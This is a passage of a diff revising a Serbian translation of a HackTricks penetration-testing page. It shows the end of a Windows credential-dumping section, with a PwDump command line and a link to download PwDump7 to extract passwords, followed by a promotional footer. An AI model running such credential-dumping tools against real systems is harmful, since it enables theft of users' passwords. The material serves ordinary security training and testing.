 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -353,22 +339,22 @@ type outpwdump
 ```
 ### PwDump7
 
-Preuzmite ga sa: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i samo **izvršite ga** i lozinke će biti izvučene.
+Preuzmite ga sa: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i samo ga **pokrenite** i lozinke će biti izvučene.
 
 ## Odbrane
 
-[**Saznajte nešto o zaštiti akreditacija ovde.**](credentials-protections.md)
+[**Saznajte više o zaštiti kredencijala ovde.**](credentials-protections.md)
 
 <details>
 
-<summary><strong>Naučite AWS hakovanje od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite AWS hakovanje od početnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Drugi načini podrške HackTricks-u:
+Drugi načini da podržite HackTricks:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNE PLANOVE**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
